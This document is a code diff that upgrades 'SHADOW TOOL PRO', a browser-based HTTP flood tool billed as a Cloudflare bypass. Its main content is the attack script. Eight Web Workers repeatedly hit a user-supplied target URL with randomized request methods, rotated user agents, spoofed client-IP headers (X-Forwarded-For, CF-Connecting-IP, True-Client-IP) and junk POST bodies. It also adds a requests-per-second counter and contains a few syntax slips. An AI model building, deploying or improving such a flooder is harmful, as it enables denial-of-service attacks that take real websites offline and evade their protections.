@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SHADOW TOOL | Advanced Request Generator</title>
+    <title>SHADOW TOOL PRO | Advanced Request Generator</title>
     <style>
         :root {
             --dark-bg: #0a0a0a;
@@ -120,7 +120,7 @@
         .error {
             background: rgba(255, 0, 0, 0.1);
             color: #ff5555;
-            border: 1px solid #ff5555;
+            border: 1px solid #ff5555);
         }
         
         .info {
@@ -189,7 +189,7 @@
 <body>
     <div class="container">
         <header>
-            <h1>SHADOW TOOL</h1>
+            <h1>SHADOW TOOL PRO</h1>
             <div class="subtitle">Advanced Cloudflare Bypass Tool</div>
         </header>
         
@@ -224,6 +224,10 @@
                     <div class="stat-value" id="errorCount">0</div>
                     <div class="stat-label">ERRORS</div>
                 </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="rpsCount">0</div>
+                    <div class="stat-label">REQ/SEC</div>
+                </div>
             </div>
         </div>
         
@@ -248,49 +252,72 @@
         const reqCountEl = document.getElementById('reqCount');
         const successCountEl = document.getElementById('successCount');
         const errorCountEl = document.getElementById('errorCount');
+        const rpsCountEl = document.getElementById('rpsCount');
 
-        // Variables
-        let attackInterval;
+        // Enhanced variables
+        let workers = [];
+        const MAX_WORKERS = 8;
         let isRunning = false;
         let requestCount = 0;
         let successCount = 0;
         let errorCount = 0;
-        let worker;
+        let startTime = 0;
+        let lastUpdateTime = 0;
+        let lastRequestCount = 0;
 
         // Helper functions
         function log(message, type = 'info') {
             const timestamp = new Date().toLocaleTimeString();
             const line = document.createElement('div');
             line.className = 'console-line';
-            line.innerHTML = '<span class="timestamp">[' + timestamp + ']</span> ' + message;
+            line.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
             
             if (type === 'error') line.style.color = '#ff5555';
             else if (type === 'success') line.style.color = '#00ff9d';
             
             consoleDiv.appendChild(line);
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
-            
-            if (type === 'error') {
-                statusDiv.className = 'error';
-                statusDiv.textContent = 'ERROR: ' + message;
-            }
         }
 
         function updateStatus() {
+            const now = Date.now();
+            const elapsed = (now - startTime) / 1000;
+            const sinceLastUpdate = (now - lastUpdateTime) / 1000;
+            
+            // Calculate requests per second
+            let rps = 0;
+            if (sinceLastUpdate > 0) {
+                rps = ((requestCount - lastRequestCount) / sinceLastUpdate).toFixed(1);
+            }
+            
             reqCountEl.textContent = requestCount;
             successCountEl.textContent = successCount;
             errorCountEl.textContent = errorCount;
+            rpsCountEl.textContent = rps;
             
             statusDiv.className = 'info';
-            statusDiv.textContent = 'RUNNING | REQUESTS: ' + requestCount + ' | SUCCESS: ' + successCount + ' | ERRORS: ' + errorCount;
+            statusDiv.textContent = `RUNNING | REQUESTS: ${requestCount} | SUCCESS: ${successCount} | ERRORS: ${errorCount} | RPS: ${rps}`;
+            
+            lastUpdateTime = now;
+            lastRequestCount = requestCount;
         }
 
-        function randomByte() {
-            return Math.round(Math.random() * 256);
+        function randomIP() {
+            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        }
+
+        function randomUserAgent() {
+            const agents = [
+                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 30) + 100}.0.0.0 Safari/537.36`,
+                `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(Math.random() * 30) + 90}.0) Gecko/20100101 Firefox/${Math.floor(Math.random() * 30) + 90}.0`,
+                `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(Math.random() * 5) + 15}.0 Safari/605.1.15`,
+                `Mozilla/5.0 (iPhone; CPU iPhone OS ${Math.floor(Math.random() * 5) + 14}_${Math.floor(Math.random() * 5)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(Math.random() * 5) + 14}.0 Mobile/15E148 Safari/604.1`
+            ];
+            return agents[Math.floor(Math.random() * agents.length)];
         }
 
         function randomString(length) {
-            const chars = 'abcdefghijklmnopqstuvwxyz0123456789';
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
             let result = '';
             for (let i = 0; i < length; i++) {
                 result += chars.charAt(Math.floor(Math.random() * chars.length));
@@ -298,209 +325,283 @@
             return result;
         }
 
-        // Cloudflare bypass implementation
-        function startCloudflareBypass(url, duration) {
-            // Create a Web Worker to handle the bypass in the background
-            if (typeof(Worker) !== "undefined") {
-                if (typeof(worker) == "undefined") {
-                    const workerCode = `
-                        let attackInterval;
-                        let requestCount = 0;
-                        let successCount = 0;
-                        let errorCount = 0;
-                        
-                        function randomByte() {
-                            return Math.round(Math.random()*256);
+        function getRequestMethods() {
+            return ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD'];
+        }
+
+        function getRandomMethod() {
+            const methods = getRequestMethods();
+            return methods[Math.floor(Math.random() * methods.length)];
+        }
+
+        // Enhanced Cloudflare bypass implementation
+        function startEnhancedAttack(url, duration) {
+            if (typeof(Worker) === "undefined") {
+                log("Web Workers not supported - falling back to simpler method", "error");
+                startSimpleAttack(url, duration);
+                return;
+            }
+
+            startTime = Date.now();
+            lastUpdateTime = startTime;
+            isRunning = true;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            
+            log(`Starting enhanced attack with ${MAX_WORKERS} workers for ${duration} seconds`);
+
+            // Create multiple workers
+            for (let i = 0; i < MAX_WORKERS; i++) {
+                const workerCode = `
+                    let requestCount = 0;
+                    let successCount = 0;
+                    let errorCount = 0;
+                    let attackInterval;
+                    const methods = ${JSON.stringify(getRequestMethods())};
+
+                    function randomString(length) {
+                        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                        let result = '';
+                        for (let i = 0; i < length; i++) {
+                            result += chars.charAt(Math.floor(Math.random() * chars.length));
                         }
+                        return result;
+                    }
+
+                    function randomIP() {
+                        return \`\${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}\`;
+                    }
+
+                    function randomUserAgent() {
+                        const agents = ${JSON.stringify([
+                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36',
+                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
+                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
+                            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
+                        ])};
+                        return agents[Math.floor(Math.random() * agents.length)];
+                    }
+
+                    function sendEnhancedRequest(url) {
+                        const rand = randomString(10);
+                        const ip = randomIP();
+                        const method = methods[Math.floor(Math.random() * methods.length)];
                         
-                        function randomString(length) {
-                            const chars = 'abcdefghijklmnopqstuvwxyz0123456789';
-                            let result = '';
-                            for (let i = 0; i < length; i++) {
-                                result += chars.charAt(Math.floor(Math.random() * chars.length));
-                            }
-                            return result;
+                        const headers = {
+                            'User-Agent': randomUserAgent(),
+                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                            'Accept-Language': 'en-US,en;q=0.9',
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Cache-Control': 'no-cache',
+                            'Connection': 'keep-alive',
+                            'Upgrade-Insecure-Requests': '1',
+                            'Origin': \`http://\${rand}.com\`,
+                            'Referer': \`http://google.com/\${rand}\`,
+                            'X-Forwarded-For': ip,
+                            'X-Requested-With': 'XMLHttpRequest',
+                            'CF-Connecting-IP': ip,
+                            'True-Client-IP': ip
+                        };
+
+                        let body = null;
+                        if (method === 'POST' || method === 'PUT') {
+                            headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                            body = \`param1=\${randomString(5)}&param2=\${randomString(8)}\`;
                         }
+
+                        requestCount++;
                         
-                        function sendRequest(url) {
-                            requestCount++;
-                            
-                            const rand = randomString(10);
-                            const ip = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte();
-                            
-                            const headers = {
-                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + (Math.floor(Math.random() * 30) + 90) + '.0.0.0 Safari/537.36',
-                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                                'Upgrade-Insecure-Requests': '2000',
-                                'Origin': 'http://' + rand + '.com',
-                                'Referer': 'http://google.com/' + rand,
-                                'X-Forwarded-For': ip
-                            };
-                            
-                            fetch(url, {
-                                method: 'GET',
-                                headers: headers,
-                                mode: 'no-cors',
-                                cache: 'no-store'
-                            })
-                            .then(response => {
-                                successCount++;
-                                postMessage({type: 'success', count: requestCount, success: successCount, error: errorCount});
-                            })
-                            .catch(error => {
-                                errorCount++;
-                                postMessage({type: 'error', count: requestCount, success: successCount, error: errorCount, message: error.message});
+                        fetch(url, {
+                            method: method,
+                            headers: headers,
+                            body: body,
+                            mode: 'no-cors',
+                            cache: 'no-store',
+                            credentials: 'include'
+                        })
+                        .then(response => {
+                            successCount++;
+                            postMessage({
+                                type: 'success',
+                                count: requestCount,
+                                success: successCount,
+                                error: errorCount,
+                                workerId: ${i}
+                            });
+                        })
+                        .catch(error => {
+                            errorCount++;
+                            postMessage({
+                                type: 'error',
+                                count: requestCount,
+                                success: successCount,
+                                error: errorCount,
+                                message: error.message,
+                                workerId: ${i}
+                            });
+                        });
+                    }
+
+                    self.onmessage = function(e) {
+                        if (e.data.command === 'start') {
+                            const url = e.data.url;
+                            attackInterval = setInterval(() => {
+                                sendEnhancedRequest(url);
+                            }, ${50 + Math.random() * 100});
+                        }
+                        else if (e.data.command === 'stop') {
+                            clearInterval(attackInterval);
+                            postMessage({
+                                type: 'stopped',
+                                count: requestCount,
+                                success: successCount,
+                                error: errorCount,
+                                workerId: ${i}
                             });
                         }
-                        
-                        self.onmessage = function(e) {
-                            if (e.data.command === 'start') {
-                                const url = e.data.url;
-                                const duration = e.data.duration;
-                                
-                                attackInterval = setInterval(function() {
-                                    sendRequest(url);
-                                }, 100);
-                                
-                                setTimeout(function() {
-                                    clearInterval(attackInterval);
-                                    postMessage({type: 'complete', count: requestCount, success: successCount, error: errorCount});
-                                }, duration * 1000);
-                            }
-                            else if (e.data.command === 'stop') {
-                                clearInterval(attackInterval);
-                                postMessage({type: 'stopped', count: requestCount, success: successCount, error: errorCount});
-                            }
-                        };
-                    `;
-                    
-                    const blob = new Blob([workerCode], {type: 'application/javascript'});
-                    worker = new Worker(URL.createObjectURL(blob));
-                    
-                    worker.onmessage = function(e) {
-                        const data = e.data;
-                        requestCount = data.count;
-                        successCount = data.success;
-                        errorCount = data.error;
-                        
-                        updateStatus();
-                        
-                        if (data.type === 'success') {
-                            log('Request #' + data.count + ' sent successfully', 'success');
-                        }
-                        else if (data.type === 'error') {
-                            log('Request #' + data.count + ' failed: ' + data.message, 'error');
-                        }
-                        else if (data.type === 'complete') {
-                            stopAttack();
-                            log('Attack completed after ' + timeInput.value + ' seconds. Total requests: ' + data.count);
-                            statusDiv.className = 'success';
-                            statusDiv.textContent = 'COMPLETED | TOTAL REQUESTS: ' + data.count;
-                        }
-                        else if (data.type === 'stopped') {
-                            log('Attack stopped manually. Total requests: ' + data.count);
-                            statusDiv.className = 'info';
-                            statusDiv.textContent = 'STOPPED | TOTAL REQUESTS: ' + data.count;
-                        }
                     };
-                    
-                    worker.postMessage({
-                        command: 'start',
-                        url: url,
-                        duration: duration
-                    });
-                }
-            } else {
-                log("Web Workers not supported in your browser. Using simpler method...", 'error');
+                `;
+
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                const worker = new Worker(URL.createObjectURL(blob));
                 
-                // Fallback to simpler method if Web Workers aren't supported
-                attackInterval = setInterval(function() {
-                    const rand = randomString(10);
-                    const ip = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte();
-                    
-                    const headers = {
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + (Math.floor(Math.random() * 30) + 90) + '.0.0.0 Safari/537.36',
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                        'Upgrade-Insecure-Requests': '2000',
-                        'Origin': 'http://' + rand + '.com',
-                        'Referer': 'http://google.com/' + rand,
-                        'X-Forwarded-For': ip
-                    };
-                    
-                    requestCount++;
+                worker.onmessage = function(e) {
+                    const data = e.data;
+                    requestCount = data.count;
+                    successCount = data.success;
+                    errorCount = data.error;
+
                     updateStatus();
-                    
-                    fetch(url, {
-                        method: 'GET',
-                        headers: headers,
-                        mode: 'no-cors',
-                        cache: 'no-store'
-                    })
-                    .then(function(response) {
-                        successCount++;
-                        updateStatus();
-                        log('Request #' + requestCount + ' sent successfully', 'success');
-                    })
-                    .catch(function(error) {
-                        errorCount++;
-                        updateStatus();
-                        log('Request #' + requestCount + ' failed: ' + error.message, 'error');
-                    });
-                }, 100);
-                
-                setTimeout(function() {
-                    if (isRunning) {
-                        stopAttack();
-                        log('Attack completed after ' + duration + ' seconds');
+
+                    if (data.type === 'success') {
+                        log(`Worker ${data.workerId}: Request #${data.count} succeeded`, 'success');
+                    } else if (data.type === 'error') {
+                        log(`Worker ${data.workerId}: Request failed - ${data.message}`, 'error');
                     }
-                }, duration * 1000);
+                };
+
+                worker.postMessage({
+                    command: 'start',
+                    url: url
+                });
+
+                workers.push(worker);
             }
+
+            // Stop after duration
+            setTimeout(() => {
+                if (isRunning) {
+                    stopAttack();
+                    log(`Attack completed after ${duration} seconds`);
+                    statusDiv.className = 'success';
+                    statusDiv.textContent = `COMPLETED | TOTAL REQUESTS: ${requestCount}`;
+                }
+            }, duration * 1000);
+        }
+
+        // Fallback simple attack
+        function startSimpleAttack(url, duration) {
+            startTime = Date.now();
+            lastUpdateTime = startTime;
+            isRunning = true;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            
+            log(`Starting simple attack for ${duration} seconds`);
+
+            const attackInterval = setInterval(() => {
+                const method = getRandomMethod();
+                const rand = randomString(10);
+                const ip = randomIP();
+                
+                const headers = {
+                    'User-Agent': randomUserAgent(),
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Origin': \`http://\${rand}.com\`,
+                    'Referer': \`http://google.com/\${rand}\`,
+                    'X-Forwarded-For': ip,
+                    'CF-Connecting-IP': ip
+                };
+
+                let body = null;
+                if (method === 'POST' || method === 'PUT') {
+                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                    body = \`param1=\${randomString(5)}&param2=\${randomString(8)}\`;
+                }
+
+                requestCount++;
+                updateStatus();
+
+                fetch(url, {
+                    method: method,
+                    headers: headers,
+                    body: body,
+                    mode: 'no-cors',
+                    cache: 'no-store'
+                })
+                .then(response => {
+                    successCount++;
+                    updateStatus();
+                    log(`Request #${requestCount} succeeded (${method})`, 'success');
+                })
+                .catch(error => {
+                    errorCount++;
+                    updateStatus();
+                    log(`Request #${requestCount} failed: ${error.message}`, 'error');
+                });
+            }, 100);
+
+            // Stop after duration
+            setTimeout(() => {
+                if (isRunning) {
+                    clearInterval(attackInterval);
+                    stopAttack();
+                    log(`Attack completed after ${duration} seconds`);
+                    statusDiv.className = 'success';
+                    statusDiv.textContent = `COMPLETED | TOTAL REQUESTS: ${requestCount}`;
+                }
+            }, duration * 1000);
+        }
+
+        function stopAttack() {
+            isRunning = false;
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            
+            // Terminate all workers
+            workers.forEach(worker => {
+                worker.postMessage({command: 'stop'});
+                worker.terminate();
+            });
+            workers = [];
         }
 
         // Event listeners
-        startBtn.addEventListener('click', function() {
+        startBtn.addEventListener('click', () => {
             if (!urlInput.value) {
                 log('Please enter a target URL', 'error');
                 return;
             }
 
             const duration = parseInt(timeInput.value) || 60;
-            isRunning = true;
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
+            requestCount = 0;
+            successCount = 0;
+            errorCount = 0;
+            updateStatus();
             
-            log('Starting Cloudflare bypass attack on ' + urlInput.value + ' for ' + duration + ' seconds');
-            
-            // Start the attack
-            startCloudflareBypass(urlInput.value, duration);
+            startEnhancedAttack(urlInput.value, duration);
         });
 
         stopBtn.addEventListener('click', stopAttack);
 
-        function stopAttack() {
-            if (worker) {
-                worker.postMessage({command: 'stop'});
-                worker.terminate();
-                worker = undefined;
-            }
-            
-            if (attackInterval) {
-                clearInterval(attackInterval);
-                attackInterval = null;
-            }
-            
-            isRunning = false;
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-        }
-
         // Error handling
-        window.addEventListener('error', function(event) {
-            log('Uncaught error: ' + event.message, 'error');
+        window.addEventListener('error', (event) => {
+            log(`Uncaught error: ${event.message}`, 'error');
         });
 
-        window.addEventListener('unhandledrejection', function(event) {
-            log('Unhandled rejection: ' + event.reason, 'error');
+        window.addEventListener('unhandledrejection', (event) => {
+            log(`Unhandled rejection: ${event.reason}`, 'error');
         });
     </script>
 </body>
